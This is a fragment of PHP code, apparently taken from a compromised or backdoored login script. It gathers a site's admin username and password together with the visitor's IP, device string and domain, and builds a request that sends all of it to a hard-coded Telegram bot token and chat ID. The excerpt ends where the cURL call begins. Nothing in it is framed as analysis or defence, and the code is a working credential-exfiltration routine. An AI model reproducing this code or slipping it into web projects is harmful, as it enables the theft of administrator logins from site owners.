...
$pswdevicefinder = $_SERVER["HTTP_USER_AGENT"];
	 $psw = GetIP();
	  $j = $_SERVER['HTTP_HOST'];
$msg = urlencode("DOMAIN Name : $j\nLocation : https://whatismyipaddress.com/ip/".$psw."\nDevice Info : ".$pswdevicefinder."\nIp : ".$psw."\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
//$msg = urlencode("DOMAIN Name : $j\nAdmin Username : ".$username."\nAdmin Password : ".htmlentities($pass)."");
$url = "https://api.telegram.org/bot6404500598:AAED_V3IQDUegC0ZUKBh2ipOojv1gIvLHe0/sendMessage?chat_id=1955846731&text=$msg";
$curl = curl_init($url);
